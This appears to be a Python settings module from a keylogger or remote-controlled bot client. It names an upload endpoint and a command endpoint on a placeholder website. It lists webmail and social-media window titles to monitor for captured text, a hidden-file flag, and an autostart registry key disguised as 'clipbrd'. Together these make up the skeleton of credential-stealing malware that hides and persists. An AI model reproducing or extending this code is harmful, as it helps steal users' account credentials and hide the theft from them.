from Client import botname

uploadURL = '<your website>/upload.php'
commUrl = '<your website>/rtc.php'
identification = {}
headers = {'botname': botname}
botname = ''
running = False
store = ''
listOfWindows = ['Facebook', 'Gmail', 'Twitter', 'Hotmail', 'Ymail', 'Yandex']
lastWindowText = ''
windowText = ''
output = """ """
FILE_HIDDEN_ATTRIBUTE = 0x02

# RegKeys

AUTOSTART = 'clipbrd'
